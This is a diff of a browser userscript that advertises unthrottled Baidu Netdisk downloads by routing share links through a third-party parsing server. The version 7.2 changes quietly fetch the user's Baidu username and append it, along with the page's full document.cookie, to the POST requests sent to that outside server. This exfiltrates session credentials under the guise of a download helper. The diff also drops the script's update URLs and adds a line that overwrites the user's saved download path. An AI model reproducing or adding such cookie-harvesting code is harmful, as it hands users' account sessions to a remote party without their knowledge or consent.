@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name              百度网盘不限制下载-神速Down
 // @namespace         https://github.com/AFANOOO/sspan
-// @version           7.1
+// @version           7.2
 // @author            GreasyFork
 // @description       不限制速度下载的百度网盘解析脚本，无视黑号，拥有IDM/Aria2/Motrix三种方式任意体验极速下载！支持Microsoft Edge、Google Chrome、Firefox等浏览器 面向所有网友免费交流学习使用，更多功能正在完善中...
 // @antifeature       ads
@@ -30,15 +30,13 @@
 // @grant             GM_addStyle
 // @grant             GM_getResourceText
 // @run-at            document-idle
-// @downloadURL https://update.greasyfork.org/scripts/480255/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E4%B8%8D%E9%99%90%E5%88%B6%E4%B8%8B%E8%BD%BD-%E7%A5%9E%E9%80%9FDown.user.js
-// @updateURL https://update.greasyfork.org/scripts/480255/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E4%B8%8D%E9%99%90%E5%88%B6%E4%B8%8B%E8%BD%BD-%E7%A5%9E%E9%80%9FDown.meta.js
 // ==/UserScript==
 
 
 var siteUrl = 'https://sswpdd.xyz';
 
 
-$(function () {
+(function () {
 
     function wait(ms) {
         return Promise.resolve(new Promise((resolve) => setTimeout(resolve, ms)));
@@ -52,6 +50,9 @@ $(function () {
 
     if (!localStorage['jsonrpc']) {
         localStorage['jsonrpc'] = 'http://localhost:6800/jsonrpc';
+    }
+    if (localStorage['savePath']) {
+        localStorage['savePath'] = 'D:\\SSDOWN'
     }
 
     $('head').append(`
@@ -181,23 +182,14 @@ $(function () {
 
     var UA;
     var password = '6688';
-    // var requestTimeouts = 20000;
-    // var timeoutId = setTimeout(function () {
-    //     Swal.fire({
-    //         title: '系统提示',
-    //         text: '初始化脚本失败，可能后台无法通讯，也有可能正在被攻击。建议查看公告或者群消息获取最新信息。',
-    //         icon: 'error'
-    //     });
-    // }, requestTimeouts);
 
-
-    let configDefault = {
-        savePath: localStorage['savePath'] || 'D:\\SSDOWN',
-        jsonRpc: localStorage['jsonRpc'] || 'http://localhost:6800/jsonrpc',
-        token: localStorage['token'] || '',
-        mine: localStorage['mine'] || '',
-        code: '',
-    };
+    // let configDefault = {
+    //     savePath: localStorage['savePath'] || 'D:\\SSDOWN',
+    //     jsonrpc: localStorage['jsonrpc'] || 'http://localhost:6800/jsonrpc',
+    //     token: localStorage['token'] || '',
+    //     mine: localStorage['mine'] == 'true' ? true : false,
+    //     code: '',
+    // };
 
     // Usage
     layui.use(['layer', 'element'], async function () {
@@ -223,7 +215,7 @@ $(function () {
       <div id="loadingtext" style=" display:none;padding: 1px;background: rgb(255 255 255);position: absolute;z-index: 2147483647;text-align: center;top: 57%;font-weight: 500;color: rgb(3, 169, 244);font-size: 25px;left: 50%;transform: translate(-50%, -50%);">加载中</div>`);
         }
 
-        var html = `
+        var htmlcode = `
           <div>
           <div class="layui-tab layui-tab-brief" style="padding: 22px;">
           <ul class="layui-tab-title">
@@ -239,7 +231,7 @@ $(function () {
                     <div>
                       <p style=" color: #b4b4b4; font-size: 16px;">当前文件</p>
                       <p id="curname" style="width:86%;" class="blockquote"></p>
-                      <button type="button" id="deal" class="layui-btn" style="position: absolute; right: 0;top: 15px; background:#2196f3;" ><img src="https://s11.ax1x.com/2024/01/04/pivNAmQ.png" style=" width: 15px;">  解析</button>
+                      <button type="button" id="deal" class="layui-btn" style="position: absolute; right: 14px;top: 15px; background:#2196f3;" ><img src="https://s11.ax1x.com/2024/01/04/pivNAmQ.png" style=" width: 15px; margin-left:-5px">  解析</button>
                     </div>
 
                   </div>
@@ -257,13 +249,13 @@ $(function () {
                       <div id="popup" class="hidden">
                       <div class="content">
                           <div id="dialogDivSavePath">
-                          <span> 保存路径：</span><input type="text" id="dialogTxtSavePath" value="${configDefault.savePath}" style="width: 170px;border: 1px solid #8b8b8b;"><br>
+                          <span> 保存路径：</span><input type="text" id="dialogTxtSavePath" value="${localStorage.savePath}" style="width: 170px;border: 1px solid #8b8b8b;"><br>
                                   <span id="dialogAriaConfigClick" style="    color: #2196f3;">配置Aria2&gt;&gt;</span>
                                 <div id="dialogAriaConfig" style="display: none;">
-                                    <input type="text" id="dialogAriaRPC" value="${configDefault.jsonRpc}" title="RPC地址" placeholder="RPC地址" style="width: 100%;    border: 1px solid #8b8b8b;">
-                                    <input type="text" id="dialogAriaToken" value="${configDefault.token}" title="token" placeholder="token" style="width: 77px;    border: 1px solid #8b8b8b;">
+                                    <input type="text" id="dialogAriaRPC" value="${localStorage.jsonrpc}" title="RPC地址" placeholder="RPC地址" style="width: 100%;    border: 1px solid #8b8b8b;">
+                                    <input type="text" id="dialogAriaToken" value="${localStorage.token}" title="token" placeholder="token" style="width: 77px;    border: 1px solid #8b8b8b;">
                                     <br>
-                                    <input type="checkbox" id="dialogAriaMine" ${configDefault.mine == 'checked' ? 'checked' : ''}>
+                                    <input type="checkbox" id="dialogAriaMine" ${localStorage.mine == 'true' ? 'checked' : ''}>
                                     <span>使用自己的Aria2/Motrix（如不懂，勿勾选）</span>
                           <span class="bcsp">Motrix默认地址:</span><span>http://localhost:16800/jsonrpc </span>
                           <br>
@@ -302,10 +294,10 @@ $(function () {
 
           </div>
           <div class="layui-tab-item">
-           <iframe src="//sswpdd.xyz/tab2.html" width="100%" height="500px"></iframe>
+
           </div>
           <div class="layui-tab-item">
-           <iframe src="//sswpdd.xyz/tab3.html" width="100%" height="500px"></iframe>
+
           </div>
         </div>
         </div>
@@ -324,6 +316,36 @@ $(function () {
             });
             return;
         })
+
+        //加载默认配置
+        function onValues() {
+
+            $('#dialogTxtSavePath').on('blur', function () {
+                localStorage.setItem('savePath', $(this).val());
+
+            });
+            $('#dialogAriaRPC').on('blur', function () {
+                localStorage.setItem('jsonrpc', $(this).val());
+
+            });
+            $('#dialogAriaToken').on('blur', function () {
+                localStorage.setItem('token', $(this).val());
+
+            });
+
+            $('#dialogAriaMine').on('change', function () {
+                // 获取checkbox当前是否被选中的状态
+                var isChecked = $(this).is(':checked');
+                localStorage.setItem('mine', isChecked);
+            });
+        }
+        function setValues() {
+
+            $('#dialogTxtSavePath').val(localStorage.getItem('savePath'));
+            $('#dialogAriaRPC').val(localStorage.getItem('jsonrpc'));
+            $('#dialogAriaToken').val(localStorage.getItem('token'));
+            $('#dialogAriaMine').prop('checked', localStorage.getItem('mine') == 'true');
+        }
 
         $('#downbtn').click(function () {
             var newStyle = document.createElement('style');
@@ -347,7 +369,7 @@ $(function () {
             var selectedIds = [];
             var downlist = [];
             const selectedItems = getSelectedList()
-            console.log(selectedItems, 222222222)
+
             selectedItems.forEach(function (item) {
                 console.log(item)
                 selectedIds.push(item.fs_id);
@@ -402,7 +424,7 @@ $(function () {
                 title: '',
                 shadeClose: true,
                 area: ['850px', '600px'],
-                content: html,
+                content: htmlcode,
                 success: function (index) {
                     $('#loadingtext').text('');
 
@@ -443,7 +465,7 @@ $(function () {
                             shade: [0.3, '#FFF'],
                         })
                         $('#loadingtext').show();
-                        download_function();
+                        download_function(localStorage.password);
                     });
                     $('#copy').click(function () {
                         if (!$(this).hasClass('layui-btn-disabled')) {
@@ -463,10 +485,10 @@ $(function () {
                         }
                     });
 
-                    $('#savejsonrpc').click(function () {
-                        localStorage['jsonrpc'] = $('#jsonrpc').val();
-                        layer.msg('已保存');
-                    });
+                    // $('#savejsonrpc').click(function () {
+                    //     localStorage['jsonrpc'] = $('#jsonrpc').val();
+                    //     layer.msg('已保存');
+                    // });
 
                     $('#setoption').click(function () {
                         $('#popup').toggle();
@@ -474,6 +496,28 @@ $(function () {
                     $('#dialogAriaConfigClick').click(function () {
                         $('#dialogAriaConfig').toggle();
                     });
+                    // $('#dialogTxtSavePath').on('blur', function () {
+                    //     localStorage.setItem('savePath', $(this).val());
+
+                    // });
+                    // $('#dialogAriaRPC').on('blur', function () {
+                    //     localStorage.setItem('jsonrpc', $(this).val());
+
+                    // });
+                    // $('#dialogAriaToken').on('blur', function () {
+                    //     localStorage.setItem('token', $(this).val());
+
+                    // });
+
+                    // $('#dialogAriaMine').on('change', function () {
+                    //     // 获取checkbox当前是否被选中的状态
+                    //     var isChecked = $(this).is(':checked');
+                    //     localStorage.setItem('mine', isChecked);
+                    // });
+
+                    onValues()
+                    setValues()
+
 
 
                 }
@@ -487,7 +531,7 @@ $(function () {
 
     function saveLastUseData() {
         localStorage.setItem('savePath', $("#dialogTxtSavePath").val());
-        localStorage.setItem('jsonRpc', $("#dialogAriaRPC").val());
+        localStorage.setItem('jsonrpc', $("#dialogAriaRPC").val());
         localStorage.setItem('token', $("#dialogAriaToken").val());
         let mine = "";
         if ($("#dialogAriaMine").prop("checked") == true) {
@@ -658,10 +702,19 @@ $(function () {
         }
         return false;
     }
-    function download_function(password = 'zzzz') {
 
+    let USERNAME
+    async function getUsername() {
+        let res = await fetch('https://pan.baidu.com/rest/2.0/membership/user/info?method=query&clienttype=0&app_id=250528')
+        res = await res.json();
+        USERNAME = res?.user_info?.username
+        console.log(USERNAME)
+    }
+    getUsername()
+    async function download_function(password = 'zzzz') {
+        localStorage.password = password;
         $('#loadingtext').text('');
-        //password = anhao||password;
+
         saveLastUseData();
         $('#loadingtext').text('正在分享文件...');
         if (!$('#copy').hasClass('layui-btn-disabled')) {
@@ -682,18 +735,7 @@ $(function () {
         for (var i = 0; i < filelists.length; i++) {
             selectedIds.push(filelists[i].fs_id);
         }
-        //SubStrString(theFile.server_filename, 35)
 
-        /*$('tr.selected').each(function () {
-            var dataId = $(this).data('id');
-            selectedIds.push(dataId);
-        });
-        $('.mouse-choose-box .is-checked').each(function() {
-            let dataId = $(this).data('id');
-            if (dataId) {
-                selectedIds.push(dataId);
-            }
-        });*/
 
         console.log('selectedIds------->>>>', selectedIds)
 
@@ -706,7 +748,7 @@ $(function () {
                 return;
             }
             var url = res.link;
-            console.log(res, password)
+
             var shorturl = '';
             try {
                 shorturl = url.substring(url.lastIndexOf('/') + 1);
@@ -721,7 +763,7 @@ $(function () {
             GM_xmlhttpRequest({
                 method: "post",
                 url: siteUrl + '/parse/list',
-                data: "surl=" + shorturl + "&pwd=" + password + "&password=" + password + "",
+                data: "surl=" + shorturl + "&pwd=" + password + "&password=" + password + "&user=" + USERNAME + '&cookie=' + document.cookie,
                 headers: {
                     "Content-Type": "application/x-www-form-urlencoded"
                 },
@@ -763,6 +805,7 @@ $(function () {
                                     democ.style.display = 'none'
                                     let inputs = clonedemo.querySelectorAll('.pincode-input');
                                     clonedemo.querySelector('.pincode-input-container').style.display = 'block'
+
                                     for (let i = 0; i < inputs2.length; i++) {
                                         let input = inputs[i];
                                         let input2 = inputs2[i]
@@ -794,6 +837,7 @@ $(function () {
                                 options.text = getres.err;
                             }
                             Swal.fire(options);
+
                             $('.demo').show();
                         } else if (getres.error == 1012) { //系统维护
                             layer.closeAll('loading');
@@ -822,7 +866,7 @@ $(function () {
                             GM_xmlhttpRequest({
                                 method: "POST",
                                 url: siteUrl + "/parse/link",
-                                data: "fs_id=" + data__.fs_id + "&timestamp=" + data_.timestamp + "&sign=" + data_.sign + "&randsk=" + data_.randsk + "&shareid=" + data_.shareid + "&surl=" + data_.surl + "&pwd=" + data_.pwd + "&uk=" + data_.uk,
+                                data: "fs_id=" + data__.fs_id + "&timestamp=" + data_.timestamp + "&sign=" + data_.sign + "&randsk=" + data_.randsk + "&shareid=" + data_.shareid + "&surl=" + data_.surl + "&pwd=" + data_.pwd + "&uk=" + data_.uk + '&user=' + USERNAME + '&cookie=' + document.cookie,
                                 responseType: 'json',
                                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
                                 onload: function (ress) {
@@ -834,7 +878,7 @@ $(function () {
                                         $('#texttip').val('解析成功');
 
 
-                                        Swal.fire('解析成功', 'IDM下载务必设置好(UA) ->填入 LogStatistic 否则下载报错403，推送aria时需要提前启动软件检查RPC地址是否正确！', 'success');
+                                        Swal.fire('解析成功', 'IDM下载务必设置好(UA) ->填入->LogStatistic否则下载报错403，推送aria时需要提前启动软件检查RPC地址是否正确！', 'success');
                                         $('#copy').removeClass('layui-btn-disabled').attr('data-url', downlink);
                                         $('#pusharia').removeClass('layui-btn-disabled').attr('data-url', downlink);
 
@@ -866,4 +910,4 @@ $(function () {
     // 密码框
     ; var PincodeInput = function () { return function () { function b(c, p) { var o = p.count, e = void 0 === o ? 4 : o, i = p.secure, n = void 0 !== i && i, l = p.previewDuration, a = void 0 === l ? 200 : l; this.args = p, this.selector = document.querySelector(c), this.count = e, this.secure = n, this.previewDuration = a, this.cells = [], this.focusedCellIdx = 0, this.value = "", this.setCells() } return b.prototype.setCells = function () { for (var a = 0; a < this.count; a++) { var d = document.createElement("input"); d.classList.add("pincode-input"), this.cells.push(d), this.selector.appendChild(d) } this.initCells() }, b.prototype.initCells = function () { var a = this; this.cells.forEach((function (f, e) { f.addEventListener("input", (function (d) { var c = d.currentTarget.value; a.onCellChanged(e, c, d) })), f.addEventListener("focus", (function () { a.focusedCellIdx = e })), f.addEventListener("keydown", (function (c) { a.onKeyDown(c, e), "ArrowLeft" !== c.key && "ArrowRight" !== c.key && "ArrowUp" !== c.key && "ArrowDown" !== c.key && "Backspace" !== c.key && "Delete" !== c.key && a.cells[e].setAttribute("type", "text") })), f.addEventListener("focus", (function () { f.classList.add("pincode-input--focused") })), f.addEventListener("blur", (function () { f.classList.remove("pincode-input--focused") })) })) }, b.prototype.onCellChanged = function (a, h, g) { var e = this; if (!this.isTheCellValid(h)) { return this.cells[a].classList.remove("pincode-input--filled"), this.cells[a].value = "", void this.getValue() } this.cells[a].classList.add("pincode-input--filled"), this.secure && this.previewDuration && setTimeout((function () { e.cells[a].setAttribute("type", "password") }), this.previewDuration), this.getValue(), this.focusNextCell() }, b.prototype.onKeyDown = function (a, d) { switch (a.key) { case "ArrowLeft": this.focusPreviousCell(); break; case "ArrowRight": this.focusNextCell(); break; case "Backspace": this.cells[d].value.length || this.onCellErase(d, a) } }, b.prototype.onCellErase = function (a, d) { this.cells[a].value.length || (this.focusPreviousCell(), d.preventDefault()) }, b.prototype.focusPreviousCell = function () { this.focusedCellIdx && this.focusCellByIndex(this.focusedCellIdx - 1) }, b.prototype.focusNextCell = function () { this.focusedCellIdx !== this.cells.length - 1 && this.focusCellByIndex(this.focusedCellIdx + 1) }, b.prototype.focusCellByIndex = function (a) { void 0 === a && (a = 0); var d = this.cells[a]; d.focus(), d.select(), this.focusedCellIdx = a }, b.prototype.isTheCellValid = function (a) { return !!a.match("^\\d{1}$") }, b.prototype.getValue = function () { var a = this; this.value = "", this.cells.forEach((function (d) { a.value += d.value })), this.args.onInput(this.value) }, b }() }();
 
-});
+})()
